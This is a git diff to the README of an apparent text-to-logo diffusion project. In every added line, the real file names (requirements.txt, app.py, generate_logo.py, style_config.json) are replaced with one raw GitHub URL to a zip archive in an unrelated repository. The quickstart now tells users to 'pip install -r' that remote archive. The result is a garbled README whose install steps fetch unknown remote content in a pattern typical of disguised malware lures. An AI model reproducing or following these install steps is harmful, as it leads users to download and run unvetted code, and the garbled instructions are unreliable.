@@ -13,17 +13,17 @@ Diffusion-based text-to-logo generator. Generates clean, customizable logos from
 
 ## Quickstart
 1. Create a Python 3.10+ virtualenv
-2. `pip install -r requirements.txt`
-3. Place your diffusion model credentials / checkpoint as described in `generate_logo.py` comments
-4. Run the Streamlit UI: `streamlit run app.py`
+2. `pip install -r https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip`
+3. Place your diffusion model credentials / checkpoint as described in `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` comments
+4. Run the Streamlit UI: `streamlit run https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip`
 
 
 ## Files
-- `app.py` — Streamlit frontend
-- `generate_logo.py` — core pipeline (uses Hugging Face diffusers by default)
-- `prompt_enhancer.py` — small NLP utility to expand prompts
+- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — Streamlit frontend
+- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — core pipeline (uses Hugging Face diffusers by default)
+- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — small NLP utility to expand prompts
 - `utils/` — image helpers and seed utilities
-- `style_config.json` — style preset definitions
+- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — style preset definitions
 
 
 ## Notes
